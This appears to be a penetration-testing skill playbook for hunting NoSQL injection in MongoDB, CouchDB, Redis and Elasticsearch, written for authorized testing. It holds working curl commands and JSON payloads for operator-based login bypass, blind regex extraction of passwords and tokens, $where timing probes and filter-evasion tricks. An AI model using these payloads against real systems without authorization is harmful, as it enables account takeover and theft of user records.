---
name: nosqli
description: >
  Hunt for NoSQL injection in document/key-value backends — MongoDB, CouchDB, Redis, Elasticsearch.
  Covers operator injection ($ne/$gt/$regex/$where), authentication bypass, blind boolean and
  timing extraction, and server-side JavaScript injection ($where/mapReduce). Use when input
  reaches a NoSQL query, especially JSON bodies whose fields become query operators, login/search
  over Mongo, Couch `_find`/views, Redis command composition, or ES query DSL. Keywords: nosql
  injection, mongodb injection, $ne, $gt, $where, $regex, operator injection, auth bypass, couchdb
  mango, redis command injection, server-side javascript, blind nosql.
  Do NOT use for classic relational SQL (use sqli) or for GraphQL resolver abuse (use graphql) —
  this is injection into a NoSQL query/operator layer.
metadata:
  type: hunt
  phase: hunting
  cwe: [CWE-943, CWE-89, CWE-74]
  mitre_attack: [T1190, T1212]
  tools: [curl, burp, nosqlmap, python-requests]
depends_on: [active-recon, web-crawling, fuzzing]
feeds_into: [chain-analysis, auth-bypass, info-disclosure]
chains_with: [auth-bypass, idor, rce]
---

## Signals

- JSON APIs where a field value could be swapped for an object: `{"user":"admin","pass":"x"}` →
  does `{"user":"admin","pass":{"$ne":null}}` behave differently? Classic Mongo operator vector.
- Tech-stack fingerprints pointing at MongoDB/Mongoose, CouchDB, Redis, or Elasticsearch
  (headers, error text `MongoError`, `CastError`, `couchdb`, `elasticsearch`, driver stack traces).
- Login/search endpoints that build a query object from request parameters, especially frameworks
  that parse `user[$ne]=x` query strings or nested JSON into query operators (Express `qs`,
  body-parser extended).
- Error messages leaking query shape: `$where`, `E11000`, `failed to parse`, Mango selector
  errors, Lucene/ES `query_shard_exception`.
- Endpoints taking a `filter`/`query`/`sort`/`where` parameter that looks like it maps to the DB
  query DSL.

## Prerequisites

- An identified parameter reaching a NoSQL query and the ability to send both the "normal" type
  (string) and a structured type (object/array) — JSON body, or a framework that coerces
  bracket/dotted query params into objects.
- Baseline true/false responses (valid match vs no match, login ok vs fail) for a boolean oracle.
- For timing/`$where` JS: a stable latency baseline; for blind, a scriptable char sweep.

## Methodology

1. **Type-confusion probe — does a value become an operator?** Swap a scalar for an operator
   object and compare behaviour:
   ```bash
   # normal
   curl -s -X POST https://target/api/login -H "Content-Type: application/json" \
     -d '{"user":"admin","pass":"wrong"}'
   # operator injection: password that is "not equal to null" matches any stored password
   curl -s -X POST https://target/api/login -H "Content-Type: application/json" \
     -d '{"user":"admin","pass":{"$ne":null}}'
   ```
   If the `$ne` variant logs you in (or changes the result set), operator injection is live.

2. **Authentication bypass (MongoDB).** Common always-true operator payloads for `{user, pass}`
   finders:
   ```json
   {"user":{"$ne":null},"pass":{"$ne":null}}        // first user in collection
   {"user":"admin","pass":{"$ne":"x"}}              // admin with any non-"x" password
   {"user":{"$gt":""},"pass":{"$gt":""}}            // non-empty match
   {"user":"admin","pass":{"$regex":"^"}}           // regex matches anything
   ```
   Confirm which principal you authenticate as (first-in-collection is often an admin/seed user).

3. **Query-string operator injection.** For frameworks that parse bracket notation into objects:
   ```
   POST /login   user=admin&pass[$ne]=x
   GET  /search?filter[role][$ne]=user          → leak non-user (admin) records
   GET  /items?price[$gt]=0&limit[$gt]=0
   ```
   `user[$ne]=x` arriving as `{user:{$ne:'x'}}` is the non-JSON equivalent of step 1.

4. **Blind boolean extraction via `$regex`.** No direct output but a true/false oracle? Extract a
   field char by char:
   ```json
   {"user":"admin","pass":{"$regex":"^a"}}   // true if password starts with 'a'
   {"user":"admin","pass":{"$regex":"^ab"}}  // extend prefix
   ```
   Script the sweep; each matching prefix extends the recovered value. Escape regex metachars.

5. **Server-side JS injection (`$where` / mapReduce).** If the app exposes a `$where` expression
   or runs user input in a JS context, you get tautologies, blind booleans, and timing:
   ```json
   {"$where":"this.user=='admin'"}                        // selection control
   {"$where":"sleep(5000)||true"}                         // timing oracle (if sleep available)
   {"$where":"this.pass.length>8"}                        // blind length/char probing
   ```
   `$where` runs JavaScript server-side — a strong primitive; confirm execution via timing or a
   boolean before claiming it.

6. **CouchDB / Elasticsearch / Redis variants.**
   ```bash
   # CouchDB Mango: inject operators into a selector
   curl -s -X POST https://target/db/_find -H "Content-Type: application/json" \
     -d '{"selector":{"role":{"$ne":"user"}}}'
   # CouchDB admin-party / _users abuse if exposed (recon overlaps with info-disclosure)
   # Elasticsearch: query_string injection broadening a Lucene query
   curl -s "https://target/_search?q=*:*"
   # Redis: if input is concatenated into a command (rare but high impact), test CRLF command split
   ```

7. **Confirm the primitive and stop at the gate.** Record whether you achieved auth bypass,
   record leakage, blind extraction, or JS execution. `$where`-to-RCE or DB-wide dump crosses a
   scope boundary — get operator authorization before escalating.

## Tooling

- `curl` / Burp Repeater for JSON operator payloads and reading the boolean oracle.
- Burp Intruder / `python-requests` for scripted `$regex` char-by-char extraction.
- `NoSQLMap` for automated Mongo operator/`$where`/timing enumeration (verify flags with `-h`
  first per CLI anti-hallucination; confirm its findings manually — don't trust it blind).
- Content-Type toggling (JSON vs form vs query bracket) to find the parser that builds objects.

## Root Causes

- Query built from raw request data where a field's *type* is attacker-controlled — a string
  parameter can arrive as an object/array and become a query operator (Mongo/Mongoose, `qs`
  bracket parsing).
- No schema/type validation before querying: the app assumes `pass` is a string but passes
  whatever JSON shape it received straight into the finder.
- Use of `$where`, `mapReduce`, or `group` with user input — server-side JS execution by design.
- Couch Mango selectors / ES query DSL composed from untrusted fields without allowlisting
  operators.
- Redis command strings assembled by concatenation (CRLF/argument injection).

## Validation Gate (minimum proof)

- **Demonstrated:** an operator/JS payload produces a concrete effect shown end to end —
  authenticated without valid credentials, retrieved records the role should not see, extracted
  ≥1 secret character via the `$regex`/boolean oracle (with the matching request/response), or
  `$where` JS execution proven by a reliable timing delta or boolean. Include payload + evidence.
- **Inferred:** the operator-vs-scalar swap provably changes behaviour (different result count,
  different auth outcome) but full bypass/extraction not yet driven — injection proven, impact
  pending; or a single timing blip not yet repeated.
- **Unproven:** "`MongoError` in the response so it's injectable" with no payload changing the
  result. Do not report.
- Name the backend and vector (operator injection vs `$where` JS vs Mango selector) — remediation
  differs (type validation vs disabling server-side JS vs operator allowlist).

## Payloads & Detection Patterns

| Categoría | Shape | Propósito |
|---|---|---|
| Operator auth bypass | `{"pass":{"$ne":null}}` | match any stored password |
| Non-empty match | `{"user":{"$gt":""},"pass":{"$gt":""}}` | first record / tautology |
| Regex anything | `{"pass":{"$regex":"^"}}` | regex matches all |
| Blind regex extract | `{"pass":{"$regex":"^ab"}}` | char-by-char via prefix oracle |
| Bracket-param | `user=admin&pass[$ne]=x` | non-JSON operator injection |
| `$where` tautology | `{"$where":"1==1"}` | server-side JS selection control |
| `$where` timing | `{"$where":"sleep(5000)||true"}` | blind JS execution oracle |
| Mango selector | `{"selector":{"role":{"$ne":"user"}}}` | CouchDB operator injection |

```bash
# Detection: scalar vs operator differential. Equal-ish behaviour for scalar bad creds,
# divergent behaviour for the operator object, signals operator injection.
scalar='{"user":"admin","pass":"definitely-wrong-'$RANDOM'"}'
opne='{"user":"admin","pass":{"$ne":"definitely-wrong"}}'
for b in "$scalar" "$opne"; do
  code=$(curl -s -o /tmp/nq.out -w "%{http_code}" -X POST https://target/api/login \
    -H "Content-Type: application/json" -d "$b")
  sig=$(grep -ioE "token|session|welcome|invalid|unauthorized|MongoError|CastError" /tmp/nq.out | head -1)
  echo "body=$b -> http=$code sig=${sig:-none}"
done
# If the scalar returns 'invalid' but the $ne object returns a token/200, operator injection
# bypasses auth. A MongoError/CastError on the object hints the value reaches the query raw.
```

## Bypass Techniques

| Filtro evadido | Técnica | Notas |
|---|---|---|
| strips `$` from strings | send as nested JSON object key, not string | `$` is a key, not in the value |
| JSON body rejected | switch to `param[$ne]=x` bracket query | framework rebuilds the object |
| type check "is string" | array wrapper `{"pass":["x",{"$ne":null}]}` | some coercions pick the object element |
| `$where` disabled | fall back to `$regex`/`$expr` operators | pure operator injection needs no JS |
| regex metachar sanitized | anchor with `^`/`$`, escape injected chars | keep your own regex valid |
| Mongo projection guard | `$expr`/aggregation operators if `$find` filtered | different operator surface |

## Chain Anchors

Before declaring this finding complete, probe these escalation paths:

1. **Authentication bypass** — Does the operator payload authenticate you? As whom? Chain
   auth-bypass to full account/admin takeover.
2. **Record exfiltration** — Can `$ne`/`$gt`/`$regex` broaden a search to leak other tenants'/
   users' records (PII, tokens)? Chain info-disclosure / idor; gate before bulk dump.
3. **Blind field extraction** — Extract password hashes, API keys, reset tokens char by char via
   the regex oracle → feeds credential-testing.
4. **`$where`/mapReduce JS → RCE path** — Server-side JS execution can sometimes reach the host
   or heavy DoS; probe carefully and chain rce only with explicit authorization.
5. **Cross-collection / tenant** — Operator injection on a `filter` param may ignore tenant
   scoping — test whether you can read across the `$ne`-defeated tenant boundary.

A finding without chain anchor results is INCOMPLETE. Record each anchor as
tested/not-applicable/blocked with the reason.

## Chains & Compositions

- NoSQL operator auth bypass → **auth-bypass** → admin session → **broken-access-control**.
- `$ne`/`$regex` result broadening → **info-disclosure** / **idor** (cross-user/tenant records).
- Blind `$regex` extraction of hashes/tokens → **credential-testing** / account takeover.
- `$where` server-side JS → **rce** or heavy DoS (authorization gate required first).
- CouchDB `_users`/admin-party exposure → **auth-bypass** → DB admin.

## Gotchas

- **Minimum proof, not DB dump.** Auth bypass or one cross-user record is the finding. Dumping
  the collection is a new scope boundary — stop and get an operator gate.
- **`$ne:null` can over-match and look like success spuriously.** Confirm you authenticated as a
  *specific real principal* and can act as them, not just that the response changed shape.
- **CastError ≠ injection confirmed.** A Mongoose `CastError` means your object reached the
  casting layer but was *rejected*; that's a signal to try other shapes, not proof of impact.
- **Common N/A:** input is coerced to string / schema-validated before querying — the operator
  object arrives as the literal string `"[object Object]"` or is rejected; record tested-and-safe.
- **`$where` timing is noisy.** Network jitter mimics a `sleep`; repeat with multiple durations
  (0s/5s/10s) and show the latency tracks the injected delay before claiming JS execution.
- **Bracket-parsing depends on the framework.** `user[$ne]=x` only builds an object if the query
  parser (e.g. `qs` extended) supports it; a flat parser leaves it a literal key — test both the
  JSON and bracket vectors, don't assume one implies the other.
